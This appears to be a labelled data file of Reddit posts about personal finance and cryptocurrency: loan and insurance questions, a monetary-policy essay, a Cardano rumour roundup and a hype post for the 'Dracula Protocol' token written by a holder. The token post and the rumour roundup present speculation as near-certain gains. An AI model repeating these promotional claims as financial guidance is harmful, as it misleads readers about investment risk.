CryptoCurrency,"DD: No, Germany did not (yet) pass a new law that would allow thousands of institutional investment funds to invest in cryptocurrency.","There are a few posts flirting with the frontpage claiming that *""Germany has passed a new law that would allow thousands of institutional investment funds to invest in* *cryptocurrency*"". This is wrong.

&amp;#x200B;

I had to dig around a little bit to find an updated and clear source, not to mention find the law itself. [I came upon this Coindesk article and I quote: *""The bill, which was approved by Germany’s parliament last week, is expected to take effect on July 1 if it is approved by the upper house, the Bundesrat.""*](https://www.coindesk.com/proposed-legislation-in-germany-could-allow-425b-to-flow-into-crypto-report)

&amp;#x200B;

* The law was approved by the German Bundestag (the national parliament of the Federal Republic of Germany, which is a legislation branch similar to The House of Representatitves)
* As a functioning democracy with a Constitution established in 8th May 1949, new laws have to be approved *not just by the Bundestag* but by other branches of the German government.
* This includes the **Bundesrat**, which is a sort of Federal Council similar to the United States Senate.
* After being approved by **both** the Bundestag and Bundesrat, the law is then submitted to the Executive Branch to deliberate and promulgate it into effect.
* [Here is a source where you can read up and learn about German Politics and Legislation:  -](https://www.bmi.bund.de/EN/topics/constitution/legislation/legislation-node.html#:~:text=At%20federal%20level%2C%20most%20new,in%20the%20Federal%20Law%20Gazette).
* I quote: *At federal level, most new legislation is drafted by the Federal Government, to be passed by the Bundestag, the German parliament, with the participation of the Bundesrat before it is signed into law by the Federal President and promulgated in the Federal Law Gazette.*

&amp;#x200B;

This is similar to last week's ""Georgia is going to teach highschoolers about crypto"" post: only one of Georgias legislative branches approved it and it died in the Senate. The difference here is a language barrier.

Simple conclusion: A new law needs to be approved by TWO legislative entities in Germany, the **Bundestag** and the **Bundesrat** and the Executive entity. This new law was (so far) **only aproved by the first one: the Bundestag**. Claiming ""Gerrmany passed the law"" is, at this point in time, **wrong.**

CryptoCurrency,I Want to Take my Portfolio From Shapeshift (Coincap) To A Different One (Binance). Can I do That?,"I started trading cryptocurrency a few months ago, back when the whole Gamestop Shortsqueeze happened. I was excited at the idea of DOGEcoin becoming hot, so I spent a bit of money on Bitcoin, and then traded a small amount into DOGEcoin, using the App Shapeshift (Which is the wallet/trading app affiliated with Coincap).

But, I've decided–I have had it up to HERE with Shapeshift. Even though over time, my assets have almost doubled; from £30 to £50, I cannot trade or invest ANYTHING, because there are always 'problems with their websites' that make every single asset in my folio untradeable. *(The options for my assets in the trade menu are always blank, or unusable).*  
I could have easily expanded my folio and traded some of my gains into other currencies, but NO. Their uncooperative and temperamental trading app and website have basically left me with all these gains which I cannot do anything with.  
In fact, so far as I am aware, I cannot even transform my crypto gains into real life cash either. I don't know if the option is available, but it is incredibly confusing and I am tired and fed up

I have decided I would like to migrate to a different crypto trading app, but I want to know if I can take my portfolio from Shapeshift/Coincap and migrate to Binance instead. Or literally ANYTHING else that doesn't keep having these problems.

personalfinance,Is it financially better in the long run to live rent free and pay down debt/save faster or to buy a house and let it appreciate in value?,"tl/dr We are living rent/mortgage free and are able to save a bunch and pay down my husband's student loans. From a financial standpoint, would it be better to keep living rent free or buy a house in this market and let it appreciate in value?

We recently sold our house because we wanted to leave our neighborhood. It was never meant to be a long term home and we were ready to leave. This happened to coincide with the super hot real estate market and we were able to get almost double what we paid for the home five years ago. This means that we were able to walk away with a nice downpayment for our next home. Of course in this market, we're going to still be paying more than we want to and could easily be looking for months before we find the right thing.

Since we sold, we have been living in a 3bdrm house that my mother in law owns for free. The house has no mortgage so she is asking us to pay utilities and to do little projects to keep the place up. She has told us that we are welcome to live here as long as we want, and I really think she means it.

So our essential expenses are currently low. The only debt we have is my husband's federal student loans (currently $30k at approx. 5.42%). In the fall, we'll have daycare payments again, which will cost about %20 of our monthly budget. Also, we plan to add a second child in the next year or so which will bring the daycare costs up to a little over 30% of our budget. 

Since moving into the free housing, I've already been able to save money more, pay down my husband's student loans faster, and when our toddler goes to school in the fall, we won't be super stressed about the payments like I might be if we had a mortgage. I'm beginning to like this whole not paying a mortgage thing and am tempted to put the housing search on hold for a while! Like maybe 1-3 years while the kids are little and the daycare costs are so exorbitantly high.

So here are the questions: I guess I'm wondering, from a purely financial standpoint, is it better for us to stay here rent/mortage free, pay down my husband's debt, and be able to save more money or would be be better to focus really hard on finding and buying a new house and let than appreciate in value? Of course, there are emotional/personal considerations, but what about from a purely financial standpoint? Better to have no mortgage and save money/pay down student loans or to invest our money in a home that is appreciating in value? If we do chose to live rent/mortgage free for a while even if it isn't better, how much harm could that do?",finance

personalfinance,Lapsed car insurance tripled my premium,"Today I received what seemed to be a “love” letter from my insurance company, stating that my policy expires on May 31st, but I am such a great driver with no accidents, long time customer of theirs and participated in safe-driving program, so they are decreasing my premium drastically. On the following pages my jaw dropped, as my premium had tripled from what I used to pay. 

Naturally, trying to figure out the problem and they’re saying that the lapse in my insurance are causing higher rates for renewal. 

Long story short, I lived in an apartment building, where randomly mail wouldn’t come in, as the apartments are being marked as “vacant” in Usps system (not sure if it’s Usps, or landlords doing). So I signed up with insurance agent, that all of the paperwork goes through them and then they call me to sign. In November 2020, when I needed my insurance card (it’s online on the app), I realized that my insurance was cancelled about a week before. I called insurance company, they said it got cancelled, as underwriting department sent important paperwork to sign and I never returned it. So I got my agent’s office on the phone. After looking around they realized it was their fault and they forgot to notify me. Going back and forth for couple of days, insurance company didn’t budge in reinstating my car insurance,  so they opened me a new one with the same rate I had before for the leftover time on my previous policy. 
Now I have a problem, as my insurance had tripled. I contacted a few different agents and different insurance companies, but the all are at least 2,5 times higher that what I used to pay, stating that I have almost 30 days of a lapsed policy on the record, so I won’t get any better price. 


How long does lapse policy stays on the record? Is there any way of taking it off, as the agent took fault on the phone call with insurance and me?
I’m really upset about all of this, and obviously had no clue that something like that can cost so much. 
Also, it definitely was less that 30 days, as my state is pretty quick with uninsured vehicle fines and request to surrender the plates and I got nothing from the state.


TL;DR: my car insurance payment tripled, because my agent messed up last year and my previous policy lapsed. Now it stays on my record and every company gives insane high rates.",finance
CryptoCurrency,Current federal monetary policy may be contributing to the crypto boom,"The current US federal policy of zero interest rates coupled with significant asset purchases (1 trillion USD per year right now)  in the bond market may be driving significant capital into cryptocurrency. I'm going to focus on US since thats what I'm most familiar with but my understanding is that a lot of central banks are taking a similar stance. 

I'll start with interest rates. When interest rates are low, asset pricing models deeply discount future earnings, which makes so-called ""growth assets"" like tech stocks look much more attractive. Put another way, when interest rates are 0, it doesn't really matter if the asset is going to be valuable in 2021 or 2025, it all gets priced in. Accordingly, we have seen an absolute boom in growth and hypergrowth equities. Solar companies with &lt; 1 billion dollars in annual revenue carry 20 billion dollar market capitalizations. If traditional investors view cryptocurrency as an asset with substantial potential for future value/ growth, they might view the current fed policy as an opportunity to get into the crypto space.

A more important consideration may be inflation. Printing money to purchase assets to prop up the bond market is expected to lead to a substantial increase in USD inflation - which should drive investors towards inflation-resistant assets like real-estate, gold, and more recently, BTC and other cryptocurrency. 

The good news is the current policy is here to stay- at least for now. It seems like every week the fed is promising to keep juicing the economy with every tool in its arsenal - which should keep this crypto-friendly environment in place for a while yet. The music has to stop eventually though - I'll be interested to see how the crypto markets handle rising interest rates or a decreased risk of inflation in fiat currency.",cryptocurrency

stocks,Basic question about margin interest.,"I have recently opened my own personal brokerage account for the first time. I have my home paid for and my wife and I have our own retirement account set up. I have some extra cash and opened an account just to have some fun and hopefully generate some more income. I have always just invested in index funds, so I never attempted to trade or short any stocks. I wanted to try shorting a stock, so I used about 10% of the cash in my account to short a particular stock. The stock has decreased in price, but I have not bought to cover yet. However, I don’t seem to be being charged interest on the use of this margin. My assumption was that selling a stock short would result in my taking a margin loan that I would then have to pay interest on.

personalfinance,Loan Length/Payment amount Advice,"Hi All. I tried searching for this question before posting this but I could not find it. If it is out there I apologize to the mods.

So I got my current car two years ago. Was upside down on previous loan and blah blah got a crappy interest rate...8.39% for a 6 year loan. I’m paying 555 a month for this loan and owe 18955 on the car (it’s worth about 14-17k). 

I got approved to refinance for 3.59% for 66 or fewer months. My question is am I better off taking the longer term loan and paying the same amount I’m used to ($555) per month so that the extra goes directly towards principle or am I better off getting something like a 36 month loan? 

Any advice would be greatly appreciated!",finance
personalfinance,Advice needed on whether or not the pay off debt.,"So we have a personal loan with a 12.14% interest rate and sitting at 10,800.00. We have the money to pay off the loan and then use the ~300.00 a month to use toward paying off other debt and put towards saving. 

Some other factors we have a credit card that we pay off every month just for the rewards for our utilities and such. 
2 car loans one around 18,200 with 3.45% interest and the other around 16,900 with 6.35% Interest. 

And finally a credit card. That has a 3.25% rate and is at 6,900. We have enough to pay off the personal loan or the low interest credit card.

The question is though which is better? 
1. Pay off card. 
2. Pay off loan. 
3. Continue making payments on each as we are and keep some money stuck away in savings.

altcoin,Dracula Protocol V2 is Launching in 12 Hours -- Bull Case/Bear Case Analysis,"Alright guys, I’m back again.

Whether you’ve heard of Dracula Protocol yet or not, I’m here to set the arguments out for ya. Give you some in-depth understanding of the bull and bear case of the token and lend my thoughts to the future.

SO

# DRACULA PROTOCOL V2 IS LAUNCHING IN 12 HOURS

Why should you care?

Well let me make it real simple for you.

Dracula is going to be big. I mean **really** big. It has a proven utility and use case. It solves some of the biggest problems facing defi. I’ll touch on these in this post, but if you want a more in-depth explanation of how it does this then I recommend checking out the links I’ll provide below.

No more dicking around, let’s do this.

# BULL CASE

Set it and forget it yield farming.

Find a liquidity pool you like and they handle the details. Simply invest your LP tokens and the Dracula protocol will auto-compound your rewards in an interest accruing strategy, giving you higher yield rewards than other yield aggregation sites. It saves you gas and it saves you time.

Their closest comparison in my mind here is Harvest finance, BUT Dracula is poised to do what they’re doing, only better. Better incentives for pool adaptors, better incentives for single staking DRC (3.75% vs 0.5%), and greater yields for farmers(thanks to auto-compounding interest through their partnership with Rari Capital). If that’s not enough to pique your interest then let me spell it out for you. You’re getting in early on a HARVEST FINANCE LEVEL DEFI PROJECT. That’s $500 million TVL, over $100 million market cap. Buckle up.

**ETH maximalists**, this project is for you. DRC sells all LP rewards for ETH, and then invests those ETH rewards in daily auto-compounding interest strategies(Rari again). No mucking about with alt-coin swaps if you don’t want to, just stake your LP tokens and watch the ETH roll in. This has the double benefit of preventing mass-dumping of DRC by ETH hunters and providing gas savings to those looking to avoid swap fees when taking their ETH.

Still not enough? Alright, how about let’s break down the beautiful cycle that DRC is looking to set in motion.

* You still have the option of receiving your staking rewards in DRC if you so choose.
* As TVL increases, the 3.75% reward for DRC stakers grows. As this happens, more people will choose to take their staking rewards in DRC, which is done through a market buy swapping the accrued ETH for DRC. This market buy will continue to pump the price of DRC and lead to more people choosing to receive their rewards in DRC.

You see what I’m getting at? We’re looking at a **critical mass level event as capital flows in.**

Oh, and V2 will introduce a fixed supply cap of 15 million tokens with no further minting.

Now let’s rattle off some extra points just for fun.

* **PARTNERSHIPS:** The team has four major partnerships to be announced tomorrow with the launch of V2. We know of Rari so far, the others have been rumoured to be among Sushi, Yearn, Alpha Hamora, Chainlink, Aave, Keep3r and some others. Either way, this is promising to be a big partnership and the dev team has stated to already be working on more.
   * Acquiring and acting on partnerships is a huge bullish indicator in the defi space. Shows good on the dev team, while also showing use cases for unique synergies between projects. These all translate to cost-savings and increased earnings for the users.
* **FUTURE DEVELOPMENTS:**
   * The team is gearing DRC to be a meta-governance token. This means multi-platform governance across all projects which LPs are provided for. All by holding one token. This can give DRC holders an effective way to combat whale influence in these other projects. More details of this will be announced post-V2 launch.
   * Cross-chain yield farming is coming. It’s in the works and the team will elaborate on the plans for it once V2 as been rolled out.
* The team is heavily focused on security. The devs even called out an exploit they found in the Sushi protocol.
   * **Harvest Finance (there's that name again) even had an exploit**, to the tune of **$24 million.** Dracula has been running exploit free all this time.
* The code has been fully audited by multiple parties including Solidity Finance and a member of Lobster DAO.
* There are failsafe mechanisms ensuring the safety of user funds.
   * Having failsafes which would allow time for users to withdraw their funds before any malicious attack could be executed gives another layer of trust.
* The team is highly proven, DYOR and check out their other projects. Step Finance mooned hard last week largely thanks to the work of one of the devs.
* Incredibly helpful, knowledgeable, and supportive community. Great balance of memes and information. When questions of governance have arisen there have been highly intelligent and lively discussions. Plus the team admin is the most responsive I’ve seen in any crypto project.
* Outside the box marketing.
   * Whether it’s through manga, music, Tiktok, or traditional avenues like twitter and reddit, the Dracula marketing manager is spearheading a massive and unique marketing push. Influencers, artists, and more are being recruited and the work can already be seen. Unique growth-hacking avenues are essential to standing out in the crypto space and DRC isn’t afraid to trailblaze here.
* DRC has also shown itself to be incredibly resistant to market corrections. So while I’m sitting here looking at a deep shade of red across my Binance board, Dracula Protocol is blazing a trail of golden green baby.

# BEAR CASE

New projects are always risky, and while Dracula Protocol isn’t new(being founded back in October), it is a challenger in a space rife with potential competitors. While I outlined how the Harvest comparison is favourable, it also shows that they will be hard-pressed to attract TVL from an established entity. While it is certainly possible they could attract the capital as there are plenty of LP tokens not invested in yield aggregating strategies as of yet, it is not guaranteed. If this fails to materialize it would not bode well for that beautiful cycle I mentioned earlier.

Much of the bull case hinges on the single-staking rewards generating enough incentive that people will choose to receive their tokens in DRC over ETH. Without a significant TVL early on, the 3.75% reward to stakers may end up being insufficient in this regard. While the majority of users receiving their rewards in ETH would still be providing significant use to the protocol, it would certainly dampen the value of the DRC token. The TVL will depend on the successful expansion and yield available from the victim pools. There are a number already, and early numbers from V1 and the github suggest they can compete or surpass Harvest here, but we won’t know until post-launch tomorrow the exact details of this. If the team is hiding an ace up their sleeve in this regard, we’ll know soon enough.

Finally, the team is not doxxed. While this is not an uncommon approach in defi, especially with an international team, it can present a significant concern to potential investors. Many prefer a doxxed team for the sense of safety it provides. If this is a sticking point for too many it could reduce interest in the protocol.

&amp;#x200B;

While I am obviously biased af to the success of this project, and while I could counter many of these points, I’m going to refrain from doing so and encourage you to DYOR as to the severity of these in relation to the protocol. I have invested in the token and place a high degree of trust in the devs, who I have spoken to through multiple community channels personally. I’ll leave the rest up to you.

If you decide you want to join the Transylvania gang, then I’ll welcome you with open arms.

Come get your own castle brother 🏰🦇

DYOR, stay safe.DD:

2021 has been the year where I am trying to increase my financial literacy. I am 25 years old and trying to figure out the best option for me to budget. I will list the debts, interest rates, and minimum payments then talk through the scenarios. 

Quick background - I already match my employers 401K, own a home, and am working on some side hustle money, but that is new. I only count money that I ""know"" is coming in. Does not include year-end bonuses or potential pay increases. Edit: also, have a solid three month emergency fund and plan if things go completely awry. 

Truck Loan - $7,236.70 at 4.55% - minimum payment: $293.62

Student Loan - $2,982.72 at 5.05% - minimum payment: $50

Current Roth IRA contribution - $250 per month

**Option 1: Attack the debt**

Using the snowball method, put the $250 Roth IRA contributions into the truck debt first (since there is zero interest on the student loan) while making minimum payments to the student loan, which will take about 13 months to pay off. Then combine all three to attack the student loan which will take about 4 months to pay off. 

**Option 2: Store in Roth IRA**

Basically, do what I am doing now which is just make the minimum payments and keep contributing to my Roth IRA. 

**Or am I missing a better Option 3?**

I ran into the loan officer at the grocery and she informed me they were going to repo my car if I didn’t make a payment and I was incredibly confused. First, they never called! But also, I had traded in the car 3 months ago. I had called the bank to get the 10 day payoff and informed them that I was trading it in when I traded it in. In the end, the dealership issued the payment to a National bank of the same name instead of the bank where my loan was. They ‘fixed’ it and sent the updated balance to the correct bank after I called them. It finally got to my credit report that my car payment was 120+ days late and my Equifax score dropped 150 points. Today, my Equifax score is 110 points lower than my other 2. The bank doesn’t care because it wasn’t their fault. Do I have any options to get this fixed or removed from my credit report?

The pillaging never ends
 
“Some of you freaks are probably well aware of the insane upward price pressure the US real estate market has been experiencing over the course of the last year. Everyone and their mother has a story of a family member or friend who has recently ventured into the housing market in hopes of buying a home for their family only to be met with the fact that they have to be ready to move very quickly and make an offer well above the listed asking price if they want to have any chance of actually getting a property. Many people I know personally are very stressed about the situation.

What is causing this? If I had to guess, it's being driven by the exodus from large cities to suburban areas that many are making as the concept of work from home becomes more popular in the aftermath of the forced lockdowns. Many are looking for more room and more peace and quiet outside of large metropolitan areas and they are scooping up a ton of suburban homes in the process.

Could this phenomenon be the sole factor driving up home prices at the rate that they're being driven up at this current moment? It seems a bit far fetched to believe that every individual who is leaving a city is able to purchase a home hundreds of thousands of dollars above the asking price. There has to be some other force contributing to the surge in home prices.

Well, there are many out there who are saying that many large institutions, the BlackRocks of the world, are out in force joining those families who are looking for starter homes in the market. They are not only joining, but they are aggressively attempting to front run individuals so they can securitize properties to package into specific REIT products. In the process, exacerbating a heated real estate market that only seems to be getting hotter by the day.

If these rumors are found to be true, they highlight a very dark side of a fiat monetary system that has created completely perverse incentives throughout our economy. A complete lack of a quality assets that exist to serve as stores of value has driven many to treat consumption goods like real estate as places to store wealth over time. Or worse, to aggressively speculate, which seems like many institutional investors may be doing at the moment with single family homes.

Access to cheap credit via capital injections and a suppression of interest rates gives these institutions the ability to load up ""cash"" and go on buying sprees. Scooping up as many single family homes as possible and packaging them into indexed products to sell to other speculators without having any intention of ever living in the homes. Money printed ex-nihilio is going to speculators who are pushing the ability for actual families to begin building quality lives in an affordable home. The system has completely fucked them once again. Sorry, plebs!

This madness needs to stop. And luckily for us, we have Bitcoin. Bitcoin renders the concept of non-productive real estate as a store of value obsolete and, in time, will return housing back to its rightful status as a consumption good. As more and more individuals realize the opportunity cost of storing value in a house over sats is significantly high due to the fact that housing deteriorates, has high upkeep costs, and can be easily confiscated by a government compared to bitcoin which is digital (therefore, cannot deteriorate), has extremely low (usually one-time) storage costs, and is significantly harder to confiscate; real estate prices will begin to reflect this reality and fall back down to earth.

With this massive repricing will come a shift away from wildly speculating in the real estate markets because institutional investors are attempting to guess where single families want to store their wealth. Another beneficial knock on effect from this repricing may be the resurgence of the middle class as housing becomes affordable for more people again. 

Until this repricing happens, the Cantillon insiders will continue to flood the real estate markets with cheap cash. Scooping up homes they never intend to live in and pricing hard working American families out of the market. We can only hope that more of the market begins to wake up to the fact that Bitcoin is a significantly better store of value.

With all that being said, it would be a bit poetic if the great value exodus out of the Frankenstein store of value assets that are most common today and into sats happens at a such a pace that makes it so these large institutions pricing out families get left holding the bag. “",cryptocurrency

I had a few paragraphs typed out, but I'll save the spiel and give you guys the bullet points

- 26 years old, unmarried, no kids
- ~$170k in relatively liquid funds
- Zero debt
- 12 months left in school, starting salary for my to-be profession is roughly $60k in my state with possibilities of making much more (nursing school)
- Monthly expenses are low, about $1200 including everything, and that's on the high end.
- Credit score could be higher, I only first started building credit ~18 months ago (740ish)

I feel comfortable looking at cars in the ~$25k range. 

Depending on interest rates from my bank / car dealer, my plan is to put half of whatever car I get down in cash and take the rest out in the form of a loan.

If I can score a rate less than 4.2% (or so) then I might adjust that to 40% down and 60% loan, but if my loan rate is much higher than 6-7%, then I'll likely be putting as little more than half down, maybe 60-75% down, the rest loan.

Does this seem like a well thought-out plan? I am aware I'll have a large amount of capital gains tax staring me down a year from now.",finance
cardano,Cardano Rumor Rundown APR 30 2021,"Hey Everyone!

Let's go....

Newly covered today: 

1. The Africa Special made it clear that Cardano has a brilliant grand strategy for the developing world. As framed by John O’Connor this would be:  1) provide digital identity; 2) provide digital transfer of value; and 3) provide programmability of that digital value.
2. Mickey Watkins (CEO of World Mobile) added a step zero to the formula above with: 0) provide access to the digital world.
3. As has previously been mentioned, it was officially announced that Cardano is partnered with World Mobile to provide digital connectivity to people in the developing world starting in Tanzania.  They plan to have 100k subscribers in Zanzibar by the end of the year.
4. This is just the beginning in Africa.  John O’Connor had a nice tweet that very succinctly laid out some future plans. [https://twitter.com/jjtoconnor/status/1387919060197855234](https://twitter.com/jjtoconnor/status/1387919060197855234)

6. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

10. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
11. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
12. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
13. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
14. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.  
15. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
16. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this. 
17. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
18. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
19. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting. 
20. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

27. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
28. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.

32. It looks like the automated NFT maker covered yesterday,  [nft-maker.io](https://www.nft-maker.io/), actually charges 10 ADA per NFT.  Just an update on the price there since it was unknown yesterday.  
33. The Cardano tattoo phenomenon continues. This time, we even have one that actually features a depiction of the namesake.

39. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

40. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.

57. We just experienced a big flash crash in price. A prime suspect is the drop in hash rate in BTC due to the Blackouts in China. Is the crypto space ready to accept that Nakamoto style consensus on PoW leads directly to unacceptable levels of centralization? This has been the dirty secret of  PoW crypto and its decentralization loving enthusiasts for years.

58. Charles posted a somewhat cryptic tweet that read “Omega + Hydra + Mithral = GG”.  The Ourobors Omega, Ouroboros Hydra,  &amp; Mithral parts we’ve covered before.  Omega is a capstone rollup of Praos (2017), Genesis (2018), + Redux, +Chronos, +Ledger Combiners, +some other things from the rest of the space. Hydra is layer two. Mithral is trustless light wallets via zk-SNARKs.  Guesses as to the “GG” ranged from “Good Game” (as in game over for competitors) to “Goguen”.

65. Shahaf Bar-Geffen, CEO of COTI (the first recipient of a Cardano CFund investment), says he just finished recording his segment in the Africa special which he mentioned was airing at the end of April prior to the IOHK announcement of April 29th. He also said: 1) ADA Pay may be ready in early May or maybe even late April; 2) there will be a big launch for ADA Pay and once the Africa Special airs “everything will connect”; 3) “people are probably not getting how big this is….but you will down the line”; 4) COTI integration with a major exchange is happening, progress is not as quick as they would like, but it’s progressing; 5) last week they released the possible designs for debit cards, they are even considering some designs submitted by the community; 6) and iOS and Android integration is coming along nicely and well on the way.   [https://www.youtube.com/watch?v=EorsiQfEV7o](https://www.youtube.com/watch?v=EorsiQfEV7o)

67. It looks like Yellow Card and Payway are listed on the Africa Special website.  Given their business models, it is easy to guess that they could be valuable in the Pan Africa Strategy.  [https://payway.et/](https://payway.et/) [https://yellowcard.io/](https://yellowcard.io/) 
68. Partnership with World Mobile in Tanzania. Credit to Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/u/ricklepicklemydickle/) for originally finding this one.

69. Recap from yesterday:  the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3)  [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.  
70. Once again we are the champions! Not just of github commits this time, but also of total staked asset value. [https://www.stakingrewards.com/](https://www.stakingrewards.com/)
71. Rick interviewed CardStarter which is a Cardano accelerator. The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) they plan to fund projects prior to token launch through token vouchers, and 3) it sounds like they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.  Watch the interview and form your own opinion.  [https://youtu.be/nIklWKtr\_aY](https://youtu.be/nIklWKtr_aY) [https://cardstarter.io/](https://cardstarter.io/)
72. The Cardano Foundation has adjusted its delegation strategy. This brings up a question:  where does the balance lie between allowing Adam Smith’s hidden hand to work its free market magic and trying to help small pools?

74. We’ve had really good reporting from the community on World Mobile developments with Cardano. I just want to take a second to thank you guys. Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/user/ricklepicklemydickle/) first alerted us to the World Mobile developments and then youtube user [Whiskey 1234](https://www.youtube.com/channel/UCyBeEq-paultoA127TYcDjQ) (love both usernames btw) let us know that he attended a conference where he encountered World Mobile and “asked them if they knew about Cardano blockchain and the reply was they were announcing partners at the end of this month.” Thank you very much for this intel guys.This is what Army of Spies is all about. Many thanks for your contributions, gentlemen. 
75. Alko Sumatra Kopi is going to export 100 tonnes of coffee from Sumatra to China and track it all farm to cup using Emurgo Trace!

76. In Charles’s recent AMA, he mentioned that the Africa Special will be a Pan African event and they WILL talk about various deals they have in multiple countries. So, this tells us they do have multiple deals in multiple countries. That was a little unclear previously.  [https://www.youtube.com/watch?v=8mP0JSgf9CU](https://www.youtube.com/watch?v=8mP0JSgf9CU)

78. The number of defi projects that have announced plans to be on Cardano just keeps climbing with [Yayswap.io](https://yayswap.io/) joining the list of Liqwid, Occam,  and CardSwap/CardStarter.
79. Kraken publishes a “What is Cardano?” article.   Says “...Cardano may not promise new ground-breaking features..” Oh yeah?  What about native tokens that don’t require smart contracts?  What about the EUTXO model allowing predictable and accurate local calculation of transaction fees in your wallet before you execute? What about a consensus algorithm that’s so good, another top 10 coin made their system derivative of it? That’s all standard these days?

85. Charles does a big interview with Forbes and points out the huge differences between a bonded staking system (ETH) and a liquid staking system (Cardano). This is highly overlooked.

86. Charles also covers his projections about interoperability and the future converging on a “wifi moment” when an interoperable “internet of blockchains” emerges.  In this future, it will be a race to the bottom and the systems that are too expensive to operate will simply be priced out of the game.

